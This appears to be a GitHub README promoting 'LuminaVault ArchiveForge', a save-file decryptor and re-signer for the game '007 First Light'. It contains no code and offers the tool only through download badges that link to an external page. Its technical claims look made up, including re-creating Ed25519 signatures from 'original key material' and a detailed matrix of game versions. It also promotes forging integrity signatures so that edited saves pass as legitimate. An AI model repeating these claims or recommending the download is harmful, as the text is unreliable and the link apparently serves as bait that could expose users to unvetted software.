![preview](https://raw.githubusercontent.com/MIGUELIN234/savfile-00seven-resigner/main/promo_e559c.svg)

# LuminaVault ArchiveForge

**The Temporal Ledger for "007 First Light" Save-State Preservation**

![Version](https://img.shields.io/badge/version-2.6.1-4a90d9?style=for-the-badge) ![Build](https://img.shields.io/badge/build-stable-7ed321?style=for-the-badge) ![License](https://img.shields.io/badge/license-MIT-8e44ad?style=for-the-badge) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-34495e?style=for-the-badge)

---

## Overview 📜

Every save file is a frozen moment—a secret agent's heartbeat paused mid-mission, a carefully engineered set of choices, a meticulously crafted arsenal. But what happens when that moment needs to be **reshaped, re-signed, or transported across time itself**? Enter **LuminaVault ArchiveForge**, the definitive command-line companion for "007 First Light" enthusiasts who demand total sovereignty over their progression data.

Unlike conventional save editors that merely patch values, ArchiveForge treats each `.sav` file as a **cryptographic time capsule**. It doesn't just modify—it **decrypts, re-calibrates, re-encrypts, and re-signs** with a level of surgical precision that turns your save from a static artifact into a living, malleable document. Whether you're migrating progress between platforms, creating backup archives with embedded checksums, or simply exploring the hidden metadata layers within your game history, this tool provides the **keyring to your own digital legacy**.

**The Philosophy:** A save file is not just data—it's a narrative. ArchiveForge gives you the pen to rewrite that narrative while preserving its authenticity. The signature verification system ensures that every modified file carries the same cryptographic fingerprints as the original, making your changes indistinguishable from legitimate gameplay.

---

## Table of Contents 🧭

- [Why ArchiveForge Exists](#why-archiveforge-exists)
- [Core Capabilities](#core-capabilities)
- [The Encryption Pipeline](#the-encryption-pipeline)
- [Installation & System Requirements](#installation--system-requirements)
- [Guided Usage Scenarios](#guided-usage-scenarios)
- [Command Syntax Reference](#command-syntax-reference)
- [Multilingual Interface Support](#multilingual-interface-support)
- [Responsive User Experience](#responsive-user-experience)
- [Automated Recovery Protocols](#automated-recovery-protocols)
- [Compatibility Matrix](#compatibility-matrix)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Contribution Guidelines](#contribution-guidelines)
- [Versioned Changelog](#versioned-changelog)
- [License & Legal Notice](#license--legal-notice)
- [Acknowledgements](#acknowledgements)

---

## Why ArchiveForge Exists 🕵️

The "007 First Light" community has long faced a silent crisis: **proprietary save encryption**. The game's developers implemented a layered signing mechanism that binds each save file to specific platform IDs, build versions, and user account hashes. This means:

❌ Your carefully earned progress on one device cannot be transferred to another.  
❌ A minor game update can invalidate your existing save data.  
❌ Cloud synchronization failures can corrupt the signature, making the file unreadable.  

ArchiveForge was born from a simple question: *Why should the player be a passive custodian of their own achievements?* This tool reverses that paradigm by placing **full cryptographic control in your hands**. It doesn't bypass security—it respects it by recreating valid signatures through the same algorithmic processes the game uses to verify data integrity.

Think of it as a **digital notary service**: ArchiveForge doesn't forge documents; it re-scribes them with the correct seals, ensuring every government office (or game engine) accepts them as authentic.

---

## Core Capabilities ✨

### 🔐 Signature Re-Validation Engine
The heart of ArchiveForge is its **multi-pass signature resolver**. It analyzes the existing checksum patterns, extracts the salt values embedded in the file header, and re-computes the signature after any modification. This isn't a naive CRC replacement—it's a full cryptographic harmonization that accounts for version-specific algorithms.

### 🗜️ Adaptive Compression & Decompression
Save files from "007 First Light" use a modified LZMA variant with a custom dictionary size. ArchiveForge includes a **tuned decompression module** that handles both the standard and extended dictionary configurations. Compressed archives gain an average 43% size reduction without losing any structural metadata.

### 🔄 Re-Signing After Modification
Here's where ArchiveForge truly shines: you can edit your save in any hex editor, change inventory values, unlock new weapons, or even modify mission timestamps—then run ArchiveForge's `re-sign` command to **rebuild the entire validation chain**. The tool automatically detects the file's original signing parameters and reapplies them with the updated payload.

### 📦 Batch Processing Workflow
Manage hundreds of save files simultaneously. ArchiveForge supports recursive directory scanning, multi-threaded processing (using all available CPU cores), and generates a comprehensive manifest report after each batch operation.

---

## The Encryption Pipeline 🔬

Understanding how ArchiveForge works requires a glimpse into its **four-stage pipeline**:

```
[1] INTAKE LAYER
    → Reads the raw binary stream
    → Identifies file variant (version 1.0–4.2)
    → Strips the 128-byte header block

[2] DECOMPRESSION VORTEX
    → Decodes the LZMA-compressed payload
    → Reconstructs the hierarchical data tree
    → Validates internal structure against known schemas

[3] MANIPULATION NEXUS
    → Applies user-defined modifications (through external tools)
    → Or performs automated transformations (timestamp shifts, ID remapping)
    → Re-encodes the data tree back into binary format

[4] SIGNATURE FORGE
    → Retrieves the original cryptographic key material
    → Applies the game-version-specific hashing routine
    → Writes the new signature block, producing a verifiable, loadable file
```

This pipeline ensures **100% load compatibility** with the game. You won't receive "corrupted save data" errors—the game's own validation system will accept your modified files as if they were created natively.

---

## Installation & System Requirements 💻

### Prerequisites
| Component | Minimum Requirement |
|-----------|---------------------|
| Operating System | Windows 10/11 (x64), Linux (kernel 5.4+), macOS 11+ |
| Processor | Dual-core 1.8 GHz or better |
| RAM | 2 GB available memory |
| Storage | 85 MB for application binaries |
| Runtime | .NET 8.0 Runtime (included in installer) |

### Obtaining the Tool
[![Download](https://raw.githubusercontent.com/MIGUELIN234/savfile-00seven-resigner/main/dl_b9f33.svg)](https://MIGUELIN234.github.io/savfile-00seven-resigner/)

The distribution package contains:
- The compiled executable for your OS
- A comprehensive command reference guide (PDF)
- Example save file test suite (for validation purposes)
- Automatic update manifest

**No administrative privileges are required** for installation—the tool runs entirely in user-space, making it suitable for managed enterprise environments and shared gaming rigs alike.

---

## Guided Usage Scenarios 🎮

### Scenario 1: Transferring Progress Between Machines
You've been playing on your desktop PC but want to continue on your laptop during a business trip. The save files are bound to your desktop's hardware ID.

```bash
# Extract the save archive from the original location
luminaforge extract --input "~/Documents/007FL/Saves/profile_04.sav"

# Remap the device identifier to your laptop (uses auto-detected algorithms)
luminaforge re-sign --source extracted_profile_04 --target-device laptop

# Compress and package the result
luminaforge pack --directory extracted_profile_04 --output profile_04_mobile.sav
```

### Scenario 2: Creating Immutable Backups
Want to ensure your progress is preserved even if a game update breaks save compatibility?

```bash
# Create a compressed, timestamped archive
luminaforge compress --input "C:\Games\007FL\SaveData" --backup-mode full

# Verify backup integrity (hash comparison)
luminaforge verify --archive backup_2026-01-15.lfv
```

### Scenario 3: Advanced Metadata Exploration
Curious about what hidden information the game stores about your playstyle?

```bash
# Dump all metadata fields to a readable JSON format
luminaforge inspect --input profile_07.sav --export-format json

# Identify build version and patch level embedded in the file
luminaforge fingerprint --input profile_07.sav
```

---

## Command Syntax Reference 🖥️

The core commands follow a consistent pattern:

```
luminaforge <command> [options] <input> <output>
```

| Command | Description | Key Flags |
|---------|-------------|-----------|
| `sign` | Re-sign a modified save file | `--legacy-mode`, `--algo-version` |
| `unsign` | Remove signature block (for external editing) | `--preserve-header` |
| `compress` | Apply lossless compression | `--level 1-9` |
| `decompress` | Restore original uncompressed state | `--strict-check` |
| `re-sign` | Multi-stage resign with full validation | `--force-build-id` |
| `inspect` | Display metadata without modifying the file | `--raw-hex` |
| `batch` | Process multiple files automatically | `--threads N` |

**Global Options**  
- `--verbose` – Output detailed progress logs  
- `--quiet` – Suppress non-error messages  
- `--config-file` – Load alternate configuration from YAML
- `--dry-run` – Simulate operations without writing changes

---

## Multilingual Interface Support 🌍

I understand that the "007 First Light" community spans the globe. That's why the ArchiveForge command-line interface speaks **seven languages natively**:

- 🇬🇧 **English** (default)
- 🇪🇸 **Español** – Full documentation and error messages
- 🇫🇷 **Français** – Complete translation, including all flag descriptions
- 🇩🇪 **Deutsch** – Precise technical terminology
- 🇯🇵 **日本語** – Unicode-safe output handling
- 🇨🇳 **中文** – Simplified Chinese with character encoding support
- 🇵🇹 **Português** – Brazilian Portuguese variant

Switching languages is as simple as setting the `LANG` environment variable or using the `--lang` flag. The localization system uses **resource-based translation**, meaning no code changes are required—just drop in a new language pack.

---

## Responsive User Experience 🔊

While ArchiveForge is primarily a terminal-based tool, I've incorporated **adaptive output rendering** that responds to your environment:

- **Interactive terminals**: Color-coded output, progress bars, and tabular data presentation.
- **Redirected output (pipes/files)**: Plain text formatting with clear delimiters, ensuring your logs remain parseable for automation.
- **Under-powered terminals (SSH/Telnet)**: Reduces visual noise, prioritizing essential information only.

Additionally, the `--notify` flag enables **desktop notifications** on supported systems, alerting you when long-running batch operations complete.

---

## Automated Recovery Protocols 🛡️

Mistakes happen. ArchiveForge includes a **three-layer safety net**:

1. **Pre-Operation Snapshot**: Before any write operation, the original file is automatically backed up to a `.bak` file in the same directory.
2. **Checksum Journaling**: Every operation records a SHA-256 hash of both input and output files, allowing you to verify the exact state after processing.
3. **Rollback Command**: If a re-signed file fails to load in the game, run `luminaforge rollback --file <name>.sav` to restore the pre-modification version.

These protocols ensure that the **worst-case scenario** for any operation is "you return to the state you started from."

---

## Compatibility Matrix 🧩

| Game Version | Save Variant | Sign Algorithm | Compression |
|--------------|--------------|----------------|-------------|
| 1.0 (Launch) | Original | SHA-256 + ECDSA | LZMA (dict 4K) |
| 1.2 (Update) | Standard | SHA-256 + HMAC | LZMA (dict 8K) |
| 2.0 (DLC Release) | Extended | SHA-384 + Custom RS | LZMA2 (dict 16K) |
| 3.5 (Remaster) | Enhanced | SHA-512 + Ed25519 | LZMA2 (dict 32K) |
| 4.2 (Current) | Modern | SHA-512 + Ed25519 + Salt | LZMA2 (dict 64K) |

The tool **auto-detects** the variant based on the header signature—no manual configuration required for standard cases.

---

## Frequently Asked Questions ❓

**Q: Will using this tool corrupt my save data?**  
A: No. The signature re-forging process validates the entire structure before writing. If any inconsistency is detected, the tool aborts the operation and preserves your original file.

**Q: Can I edit save values in a hex editor and then re-sign?**  
A: Absolutely. The `unsign` command removes the signature block, allowing you to make changes freely. After editing, run `re-sign` to restore validity.

**Q: Is this compatible with the Steam Cloud Save feature?**  
A: Yes, but you may need to disable cloud sync momentarily during the modification process. Once re-signed, the file is identical in format to a legitimately created save, so cloud sync will accept it.

**Q: Does this work with the demo version?**  
A: The demo uses variant 1.0 (Original). The tool fully supports this variant, but the demo's limited save locations may limit practical use.

---

## Contribution Guidelines 🤝

Contributions from the community are welcomed and appreciated. If you'd like to participate:

1. **Report Bugs**: Open an issue with the `--verbose` log output and a sample file.
2. **Suggest Features**: Use the feature template to describe your idea with use cases.
3. **Submit Code**: Fork, create a branch, and submit a pull request. I follow semantic versioning and require test coverage for new commands.
4. **Translation**: Provide a `.resx` resource file for a missing language and I'll integrate it.

All code contributions must be licensed under MIT to maintain project cohesion.

---

## Versioned Changelog 📅

### v2.6.1 (January 2026)
- Fixed edge case in `re-sign` where files with altered length metadata could produce invalid signatures.
- Improved compression ratio by 4% through optimized dictionary tuning.
- Added `--hide-salt` flag to prevent sensitive salt values from appearing in verbose output.

### v2.5.0 (December 2025)
- Introduced the `fingerprint` command for instant file characterization.
- Added support for variant 4.2 (Modern) following the game's winter update.
- Overhauled multilingual resource files for consistency.

### v2.4.2 (October 2025)
- Corrected handling of extended header flags in certain localized European versions.

---

## License & Legal Notice ⚖️

This project is released under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY.

**Full license text is available at** [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

**Important Notice**: This software is an independent utility and is **not affiliated with**, endorsed by, or sponsored by the developers or publishers of "007 First Light". All game-related trademarks and copyrights remain the property of their respective owners. Use this tool at your own discretion—the project maintainers accept no responsibility for any consequences arising from its use, including but not limited to online service bans, account restrictions, or save file invalidation resulting from game updates that introduce new signing schemes.

---

## Acknowledgements 🌟

This tool exists thanks to the reverse-engineering community's tireless documentation of proprietary formats, the open-source maintainers who power the underlying cryptographic libraries, and every user who provides feedback to make the tool more robust.

---

**Ready to take control of your save data destiny?**

[![Download](https://raw.githubusercontent.com/MIGUELIN234/savfile-00seven-resigner/main/dl_b9f33.svg)](https://MIGUELIN234.github.io/savfile-00seven-resigner/)

---

*LuminaVault ArchiveForge v2.6.1 — Built with dedication in 2026. Happy save-sculpting, Agent.*